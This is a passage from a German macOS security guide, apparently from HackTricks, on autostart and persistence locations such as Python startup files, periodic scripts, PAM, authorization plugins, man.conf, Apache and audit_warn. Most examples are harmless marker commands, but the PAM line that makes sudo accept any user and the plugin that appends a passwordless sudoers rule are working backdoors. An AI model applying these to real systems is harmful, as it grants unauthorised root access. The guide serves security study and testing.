Dies sind zwei unterschiedliche Installationswege. Die [Chrome-Dokumentation zur externen Installation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) besagt, dass **Windows- und macOS-Benutzer eine über eine *External Extensions*-Datei angebotene Erweiterung bestätigen und aktivieren müssen**; sie wird nicht allein dadurch ausgeführt, dass diese JSON-Datei geschrieben wird. Für die Installation für alle Benutzer unter macOS muss Chrome außerdem sicherstellen, dass die Datei für externe Erweiterungen vor Änderungen durch nicht privilegierte Benutzer geschützt ist. Eine verwaltete Richtlinie `ExtensionInstallForcelist` oder `ExtensionSettings` kann eine Erweiterung ohne diese Benutzerinteraktion installieren und anheften; [Googles Richtlinienleitfaden für Mac](https://support.google.com/chrome/a/answer/7517624) beschreibt die verwaltete Konfiguration und besagt, dass Benutzer zwangsinstallierte Erweiterungen nicht entfernen können. Das ist ein Richtlinienbereitstellungsweg, kein `defaults write`-Shortcut pro Benutzer.<sup>[[49]](#references)</sup>

> [!WARNING]
> Unter macOS muss ein *External Extensions*-JSON-Manifest auf eine **Chrome Web Store**-Update-URL verweisen, nicht auf eine lokale CRX-Datei. Für die Bereitstellung über verwaltete Richtlinien gelten eigene Enterprise-Voraussetzungen; sie kann eine verwaltete, selbst gehostete Update-URL erlauben. Für eine lokale, entpackte Erweiterung in einem Testprofil ist der Chrome-Entwicklermodus-Schalter `--load-extension=/path` ein separater Mechanismus und macht eine External-Extensions-JSON-Datei nicht selbst ausführend. Ein Schreibvorgang in `Secure Preferences` ist nicht mit einer der beiden dokumentierten Registrierungsarten gleichzusetzen.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Chrome in diesem Wegwerfaccount und beobachte die Aktivierungsaufforderung; das eigene Verhalten der Extension ist der Ausführungs-PoC, sobald der Benutzer zustimmt. Entferne nach dem Test das Manifest und deaktiviere/deinstalliere die Extension in diesem Profil. Dieser Pfad wurde im aktiven Chrome-Profil auf dem Research-Mac **nicht** getestet. Der Weg über Managed Policies wurde dort ebenfalls nicht eingerichtet.

Force-install und External Extensions beziehen sich auf Extension-IDs aus dem **Chrome Web Store**; für den Trick auf niedrigerer Ebene, eine lokale Extension unbemerkt einzuschleusen, indem die HMAC-signierte `Secure Preferences` des Profils bearbeitet wird, sowie für anderen Missbrauch von Chromium-Prozessen, siehe:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL-Schema- und Dateityp-Handler (LaunchServices)

Write-up: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Der Auslöser ist, dass das Opfer auf einen Link klickt (z. B. in Chrome/Brave/Safari) oder eine Datei des registrierten Typs öffnet
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Ein App-Bundle mit `Info.plist`, in der **`CFBundleURLTypes`/`CFBundleURLSchemes`** (benutzerdefiniertes URL-Schema) oder **`CFBundleDocumentTypes`** (Dateierweiterung/UTI) deklariert sind
- Effektive benutzerspezifische Standardwerte können in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (Array `LSHandlers`) erscheinen. Apples unterstützte API zur Auswahl eines Standardhandlers für ein URL-Schema ist `LSSetDefaultHandlerForURLScheme`; das direkte Schreiben in diese plist ist keine dokumentierte Registrierungs- oder Cache-Aktualisierungsmethode.

#### Beschreibung & Ausnutzung

Launch Services bezieht URL-Schema- und Dokumentzuordnungen aus der `Info.plist` einer registrierten App. [Apples Registrierungsleitfaden](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) besagt, dass die Registrierung erfolgen kann, wenn Finder die App entdeckt, beim Start oder Login oder über eine explizite Registrierungs-API; eine App irgendwo abzulegen, löst dies nicht garantiert sofort aus. Nach der Registrierung kann das Öffnen einer passenden URL oder eines passenden Dokuments die ausgewählte Handler-App starten, vorbehaltlich der Auswahl des Standardhandlers durch den Benutzer und der normalen macOS-Startprüfungen. Die unterstützte API `LSSetDefaultHandlerForURLScheme` ändert den vom Benutzer bevorzugten URL-Handler; sie bewirkt nicht, dass eine neu abgelegte App automatisch ausgeführt wird.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

No app was registered, and no handler preference was changed on the macOS 26.5.2 research Mac. To test an actual handler, use a disposable user account, register a marker-only app with a unique scheme, invoke its URL, then remove the app and its registration.

Eine ausführliche Anleitung zum Auflisten und Missbrauchen von Dateierweiterungs- und URL-Scheme-Handlern findest du hier:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

<a id="python-startup-files-pth--usercustomize--sitecustomize"></a>

### Python-Startdateien (`.pth` / `.start` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wird ausgeführt, wenn der entsprechende Python-Interpreter mit aktiviertem Site-Verzeichnis startet; der Trigger gilt nicht für alle virtuellen Umgebungen, Python-Builds oder Start-Flags
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Wird mit den Berechtigungen/TCC des Prozesses ausgeführt, der den Interpreter gestartet hat

#### Speicherort

- **`$(python3 -m site --user-site)/*.pth`** (macOS-Framework-Builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Kein Root erforderlich (vom Benutzer beschreibbar)
  - **Trigger**: Start dieser Python-Version mit aktiviertem User-Site; das `site`-Modul verarbeitet `.pth`-Dateien in aktiven Site-Verzeichnissen
- **`<site-packages>/*.start`** (Python 3.15+; User- oder Interpreter-Site-Verzeichnis)
  - **Trigger**: Start eines Interpreters, der das Verzeichnis einbindet und `site` lädt.<sup>[[58]](#references)[[59]](#references)</sup>
- **`<user-site>/usercustomize.py`**
  - Kein Root erforderlich
  - **Trigger**: Start mit aktiviertem User-Site (wird automatisch von `site` importiert)
- **`<prefix>/site-packages/sitecustomize.py`** (z. B. `/opt/homebrew/lib/python3.13/site-packages/` oder Systempfade)
  - Root/Admin kann abhängig vom Speicherort des Interpreters erforderlich sein
  - **Trigger**: Start eines Interpreters, der dieses Site-Verzeichnis einbindet

#### Beschreibung & Ausnutzung

Beim Start importiert Python normalerweise `site` und durchsucht die aktiven `site-packages`-Verzeichnisse nach `.pth`-Dateien. Neben dem Hinzufügen von Pfaden führt eine `.pth`-Zeile, die mit `import ` beginnt, Python-Code aus, selbst wenn das benannte Modul sonst nie verwendet wird. Python versucht außerdem, `sitecustomize` und, **wenn das User-Site aktiviert ist**, `usercustomize` zu importieren.<sup>[[56]](#references)</sup> Der Trigger ist ein späterer Start eines Interpreters, der das geänderte Verzeichnis erkennt. `-S` deaktiviert die Verarbeitung durch `site`; `-s`, `-I` oder `PYTHONNOUSERSITE` deaktivieren die Varianten des **User-Site**. `-I` deaktiviert ein globales `sitecustomize` normalerweise nicht. Virtuelle Umgebungen können das User-Site ebenfalls ausschließen. Prüfe `python3 -m site` für den jeweiligen Interpreter.

Ab **Python 3.15** kann ein Site-Verzeichnis außerdem `<name>.start` mit einem `pkg.mod:callable`-Einstiegspunkt enthalten. Das Site-Modul importiert dieses Modul und ruft beim Interpreterstart die Funktion ohne Argumente auf, selbst wenn die Anwendung das Paket nie importiert. Beispielsweise ruft eine `foo.start`-Datei mit dem Inhalt `foo.submod:initialize` `foo.submod.initialize()` vor dem Benutzercode auf. Ein Paket oder Akteur, der in ein aktives Site-Verzeichnis schreiben kann, kann diesen Startpfad nutzen; er ist nicht auf macOS beschränkt. Wenn `foo.start` zusammen mit `foo.pth` vorhanden ist, überspringt Python 3.15+ die Importzeilen in `.pth` zugunsten des `.start`-Einstiegspunkts; ältere Interpreter ignorieren `.start` und führen weiterhin die `.pth`-Zeile aus. Dieser Versionsunterschied ist beim Testen eines Wheels über mehrere Interpreter hinweg wichtig.<sup>[[58]](#references)[[59]](#references)[[60]](#references)</sup>

Der folgende PoC wurde unter macOS 26.5.2 ausgeführt. `PYTHONUSERBASE` verschiebt für diesen Test das User-Site in ein temporäres Verzeichnis; das tatsächliche User-Site wird nicht verändert:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both markers erschienen. Bei diesem Test verhinderten `-s`, `-I` oder `-S` jeweils beide **user-site**-Marker. `sitecustomize` in einem globalen Site-Verzeichnis wurde nicht getestet.

## Root Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und es ermöglichen, etwas einfach auszuführen, indem du es **in eine Datei schreibst**, wobei du **root** bist und/oder andere **ungewöhnliche Bedingungen** erforderlich sind.

### Periodic

> [!CAUTION]
> **Historischer Mechanismus:** Auf dem Testgerät mit macOS 26.5.2 fehlen `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` und die Launch-Daemons `com.apple.periodic-*`. Gehe nicht davon aus, dass das Erstellen von `/etc/periodic` auf einem aktuellen System dessen Inhalte ausführt. Prüfe vor der Verwendung des folgenden Beispiels, ob der Befehl und ein aktivierter Scheduler in der jeweiligen Zielversion vorhanden sind.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nützlich für sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Du musst jedoch root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root erforderlich
  - **Auslöser**: Wenn der Zeitpunkt gekommen ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
  - Root erforderlich
  - **Auslöser**: Wenn der Zeitpunkt gekommen ist

#### Beschreibung & Ausnutzung

In älteren Versionen wurden die periodic-Skripte (**`/etc/periodic`**) durch **Launch-Daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*` eingeplant. Ab macOS Big Sur 11.5 führte der periodic-Runner Skripte in den periodic-Verzeichnissen als **Eigentümer der jeweiligen Datei** aus und schloss damit einen früheren Pfad zur Rechteausweitung.<sup>[[27]](#references)</sup> Die folgenden Befehle und Verzeichnisauflistungen stammen aus historischen Ausgaben und sind kein Testergebnis von macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Es gibt weitere periodische Skripte, deren Ausführung in **`/etc/defaults/periodic.conf`** angegeben ist:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Auf älteren Systemen, auf denen `periodic` und die zugehörigen launch daemons installiert und aktiviert sind, waren `/etc/daily.local`, `/etc/weekly.local` und `/etc/monthly.local` zusätzliche Ausführungspfade. Eine harmlose, schreibgeschützte Prüfung ist:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Die eigentümerbasierte Regel galt für Skripte, die sich direkt in den periodischen Verzeichnissen befanden. Der historische Wrapper `999.local` band früher `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` ein, ohne dieselbe Eigentümerprüfung vorzunehmen; wenn der Scheduler als root lief, wurden diese lokalen Dateien als root ausgeführt. Diese Unterscheidung und die Änderung in Big Sur 11.5 sind in der [ursprünglichen Recherche](https://theevilbit.github.io/beyond/beyond_0019/) dokumentiert. Keiner dieser Pfade sollte als aktiv angenommen werden, wenn `periodic` nicht vorhanden ist.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Root ist immer erforderlich

#### Beschreibung & Ausnutzung

Da PAM stärker auf **Persistence** und Malware als auf die einfache Ausführung innerhalb von macOS ausgerichtet ist, bietet dieser Blog keine detaillierte Erklärung. **Lies die Writeups, um diese Technik besser zu verstehen**.<sup>[[28]](#references)</sup>

Prüfe PAM-Module mit:

```bash
ls -l /etc/pam.d
```

Eine Persistenz-/Privilege-Escalation-Technik, die PAM ausnutzt, ist so einfach wie das Ändern des Moduls /etc/pam.d/sudo und das Hinzufügen der folgenden Zeile am Anfang:

```bash
auth       sufficient     pam_permit.so
```

Es wird also **etwa** so aussehen:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

> [!CAUTION]
> Beachte, dass dieses Verzeichnis durch TCC geschützt ist. Daher wird der Benutzer höchstwahrscheinlich aufgefordert, den Zugriff zu erlauben.

Ein weiteres gutes Beispiel ist `su`. Hier sieht man, dass es auch möglich ist, den PAM-Modulen Parameter zu übergeben (und man könnte auch diese Datei backdooren):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Autorisierungs-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und zusätzliche Konfigurationen vornehmen
- TCC-bypass: ???

#### Speicherort

- `/Library/Security/SecurityAgentPlugins/`
  - Root erforderlich
  - Außerdem muss die Autorisierungsdatenbank so konfiguriert werden, dass sie das Plugin verwendet

#### Beschreibung & Ausnutzung

Du kannst ein Autorisierungs-Plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um Persistenz aufrechtzuerhalten. Weitere Informationen zum Erstellen eines solchen Plugins findest du in den vorherigen Writeups (und sei vorsichtig: Ein schlecht geschriebenes Plugin kann dich aussperren, sodass du deinen Mac im Wiederherstellungsmodus bereinigen musst).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Verschiebe** das Bundle an den Speicherort, von dem es geladen werden soll:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Füge schließlich die **Regel** hinzu, um dieses Plugin zu laden:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** teilt dem Autorisierungsframework mit, dass es **einen externen Mechanismus zur Autorisierung aufrufen muss**. Außerdem sorgt **`privileged`** dafür, dass dieser als root ausgeführt wird.

Löse es aus mit:

```bash
security authorize com.asdf.asdf
```

Und dann sollte die **staff-Gruppe sudo**-Zugriff haben (lies `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Bericht: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und der Benutzer muss man verwenden
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/private/etc/man.conf`**
  - Erfordert root
  - **`/private/etc/man.conf`**: Wird immer verwendet, wenn man ausgeführt wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** legt fest, welche Binärdatei bzw. welches Skript beim Öffnen von man-Dokumentationsdateien verwendet wird. Daher kann der Pfad zur ausführbaren Datei geändert werden, sodass jedes Mal, wenn der Benutzer man zum Lesen von Dokumentation verwendet, eine Backdoor ausgeführt wird.<sup>[[31]](#references)</sup>

Zum Beispiel in **`/private/etc/man.conf`** festlegen:

```
MANPAGER /tmp/view
```

Und erstelle dann `/tmp/view` als:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du Root sein und Apache muss laufen
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd hat keine Entitlements

#### Speicherort

- **`/etc/apache2/httpd.conf`**
  - Root erforderlich
  - Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Du kannst in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen werden soll, indem du eine Zeile wie die folgende hinzufügst:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Auf diese Weise wird dein kompiliertes Modul von Apache geladen. Dafür musst du es entweder **mit einem gültigen Apple-Zertifikat signieren** oder **dem System ein neues vertrauenswürdiges Zertifikat hinzufügen** und es damit **signieren**.

Falls nötig, kannst du dann Folgendes ausführen, um sicherzustellen, dass der Server gestartet wird:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Codebeispiel für den Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Du musst jedoch root sein, auditd muss laufen und eine Warnung auslösen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/etc/security/audit_warn`**
  - Root erforderlich
  - **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest also deine Payload dort hinzufügen.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Du könntest mit `sudo audit -n` eine Warnung erzwingen.

### Startup Items

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**

**StartupItem** ist ein Verzeichnis, das sich entweder unter `/Library/StartupItems/` oder `/System/Library/StartupItems/` befinden sollte. Sobald dieses Verzeichnis angelegt ist, muss es zwei bestimmte Dateien enthalten:

1. Ein **rc-Skript**: Ein Shell-Skript, das beim Start ausgeführt wird.
2. Eine **plist-Datei** mit dem Namen `StartupParameters.plist`, die verschiedene Konfigurationseinstellungen enthält.

Stelle sicher, dass sowohl das rc-Skript als auch die Datei `StartupParameters.plist` korrekt im Verzeichnis **StartupItem** abgelegt sind, damit der Startvorgang sie erkennt und verwendet.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente auf meinem macOS nicht finden. Weitere Informationen findest du daher im Writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond** wurde von Apple eingeführt und ist ein Logging-Mechanismus, der unterentwickelt oder möglicherweise aufgegeben wirkt, aber weiterhin zugänglich ist. Für einen Mac-Administrator ist dieser obskure Dienst kaum von Nutzen, könnte jedoch Threat Actors als unauffällige Persistenzmethode dienen, die den meisten macOS-Admins wahrscheinlich nicht auffällt.<sup>[[34]](#references)</sup>

Für alle, die von seiner Existenz wissen, ist es einfach, eine bösartige Nutzung von **emond** zu erkennen. Der LaunchDaemon des Systems für diesen Dienst sucht in einem einzelnen Verzeichnis nach auszuführenden Skripten. Zur Überprüfung kann folgender Befehl verwendet werden:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Speicherort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root erforderlich
  - **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist **in macOS nicht mehr installiert**. Weitere Informationen findest du im Writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Die Installation eines kext ist so kompliziert, selbst als Root, dass sie ohne Exploit nicht als praktische Sandbox-Umgehungs- oder Persistenztechnik gilt.

#### Speicherort

Um ein KEXT als Autostart-Element zu installieren, muss es **an einem der folgenden Speicherorte installiert werden**:

- `/System/Library/Extensions`
  - In das Betriebssystem OS X integrierte KEXT-Dateien.
- `/Library/Extensions`
  - Von Drittanbieter-Software installierte KEXT-Dateien

Die aktuell geladenen kext-Dateien kannst du mit folgendem Befehl auflisten:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Weitere Informationen zu [**Kernel Extensions finden Sie in diesem Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Speicherort

- **`/usr/local/bin/amstoold`**
  - Root erforderlich

#### Beschreibung & Exploitation

Anscheinend verwendete die `plist` aus `/System/Library/LaunchAgents/com.apple.amstoold.plist` diese Binary und stellte dabei einen XPC service bereit ... das Problem war, dass die Binary nicht existierte. Man konnte also dort etwas ablegen und wenn der XPC service aufgerufen wurde, wurde die eigene Binary aufgerufen.<sup>[[35]](#references)</sup>

Ich kann das in meinem macOS nicht mehr finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Speicherort

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root erforderlich
  - **Auslöser**: Wenn der Service ausgeführt wird (selten)

#### Beschreibung & Exploit

Anscheinend wird dieses Skript nicht sehr häufig ausgeführt und ich konnte es in meinem macOS nicht einmal finden. Weitere Informationen finden Sie daher im Writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dies funktioniert nicht in aktuellen MacOS-Versionen**

Hier können ebenfalls **Befehle abgelegt werden, die beim Start ausgeführt werden.** Beispiel eines regulären rc.common-Skripts:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd-Boot-Tasks

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich)
- Root erforderlich, außerdem je nach Pfad entweder ein **SIP bypass** oder die Berechtigung **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access

#### Speicherort

`launchd` bettet in seinem Abschnitt **`__TEXT,__config`** eine plist ein, die frühe „Boot-Tasks“ beschreibt. Mehrere darin referenzierte Skripte/Binärdateien sind standardmäßig **nicht** vorhanden und können von einem Angreifer erstellt werden:

- SIP-bypass-Gruppe: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
